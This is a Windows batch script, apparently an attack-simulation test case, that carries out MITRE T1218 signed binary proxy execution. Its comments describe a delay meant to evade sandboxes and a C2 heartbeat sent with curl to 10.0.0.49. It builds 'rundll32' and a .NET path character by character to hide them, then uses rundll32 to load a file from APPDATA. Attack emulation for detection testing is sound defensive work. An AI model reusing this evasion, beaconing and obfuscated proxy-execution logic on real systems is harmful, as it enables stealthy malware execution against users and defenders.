@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET txisnba=%APPDATA%\9238\5356e181
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?9238-10
SET jwcnifl=ITZEL-S2BO
SET rrocubc=10
SET xzanpex=taskmgr.txt
SET dvhhyc=9238

REM Log file path
SET logfile=%APPDATA%\!rrocubc!\macula-simulations.log
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: script_start>> "!logfile!" 2>nul

REM Initial delay - evade sandbox
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay_start=initial>> "!logfile!" 2>nul
timeout /t 45 /nobreak >nul

REM C2 Heartbeat (mandatory first operation)
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_start>> "!logfile!" 2>nul
curl -k -s -o nul "!keghkgto!"
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_complete>> "!logfile!" 2>nul

REM Random delay between operations
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay_start=random>> "!logfile!" 2>nul
SET /A delay=%RANDOM% %% 15 + 10
timeout /t %delay% /nobreak >nul

REM Build LOLBIN character-by-character
SET c1=r
SET c2=u
SET c3=n
SET c4=d
SET c5=l
SET c6=l
SET c7=3
SET c8=2
SET lolbin=%c1%%c2%%c3%%c4%%c5%%c6%%c7%%c8%.exe

REM Build encoded .NET path
SET p1=C
SET p2=:
SET p3=W
SET p4=i
SET p5=n
SET p6=d
SET p7=o
SET p8=w
SET p9=s
SET p10=M
SET p11=i
SET p12=c
SET p13=r
SET p14=o
SET p15=s
SET p16=o
SET p17=f
SET p18=t
SET p19=.
SET p20=N
SET p21=E
SET p22=T
SET p23=F
SET p24=r
SET p25=a
SET p26=m
SET p27=e
SET p28=w
SET p29=o
SET p30=r
SET p31=k
SET p32=v
SET p33=4
SET p34=.
SET p35=0
SET p36=.
SET p37=3
SET p38=0
SET p39=3
SET p40=1
SET p41=9
SET ps1path=%p1%%p2%%p3%%p4%%p5%%p6%%p7%%p8%%p9%\Microsoft.NET\Framework\v4.0.30319\CL_LoadAssembly.ps1

REM Execute T1218 - Signed Binary Proxy Execution
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: T1218_start=rundll32>> "!logfile!" 2>nul
%lolbin% "!ps1path!,LoadAssemblyFromPath" "!txisnba!\!xzanpex!" "Dale"
IF !ERRORLEVEL! EQU 0 (
    SET result=1
    SET err_detail=
) ELSE (
    SET result=0
    SET err_detail=rundll32_failed
)

REM Log TTP execution
SET timestamp=!DATE:~10,4!-!DATE:~4,2!-!DATE:~7,2! !TIME:~0,8!.!TIME:~9,3!
echo [!timestamp!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed Binary Proxy Execution=!result!:!err_detail!>> "!logfile!" 2>nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: T1218_complete=!result!>> "!logfile!" 2>nul

REM Final delay
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay_start=final>> "!logfile!" 2>nul
ping -n 12 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: script_end>> "!logfile!" 2>nul